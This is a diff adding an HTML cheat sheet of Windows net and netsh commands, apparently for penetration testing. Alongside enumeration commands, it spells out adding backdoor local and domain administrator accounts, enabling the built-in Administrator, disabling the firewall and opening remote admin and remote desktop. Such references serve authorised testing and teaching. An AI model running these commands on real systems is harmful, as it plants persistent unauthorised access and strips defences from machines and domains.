@@ -1,0 +1,34 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Net / Netsh</title>
+</head><body>net user										List current user<br/>
+net user rottenadmin P@ssword123! /add 				Add a new user with password<br/>
+net localgroup Administrators						List users in the localgroup Adminsitrators<br/>
+net localgroup Administrators rottenadmin /add 			Add a user to the localgroup Administrators<br/>
+net user Administrator/Active:yes					Enable a disabled account on the system<br/>
+net use * \\IP\Share /user:&lt;&gt;						Connect to a share<br/>
+net view										View shares<br/>
+net time										<br/>
+net file<br/>
+net session										List of all established SMB sessions<br/>
+net use<br/>
+<br/>
+net config workstation						NetBIOS name, full comp name, username, domain, workgroup, more<br/>
+<br/>
+net user markitzeroda hackersPassword! /add /domain /y &amp;&amp; net group &quot;domain admins&quot; markitzeroda /add'<ul><li style="list-style-type: none"/>
+</ul>
+the <b>undocumented /y flag suppresses prompt for password longer than 14 characters</b><br/>
+<br/>
+netsh firewall show state							Firewall status<br/>
+netsh firewall show config							Firewall information<br/>
+netsh firewall set service remoteadmin enable			Allow service through the firewall<br/>
+netsh firewall set opmode disable					Disable Firewall<br/>
+<br/>
+net start|stop servicename							Start or stop a service<br/>
+<br/>
+netsh firewall set service remoteadmin enable<br/>
+netsh firewall set service remotedesktop enable<br/>
+<br/>
+<br/>
+</body></html>
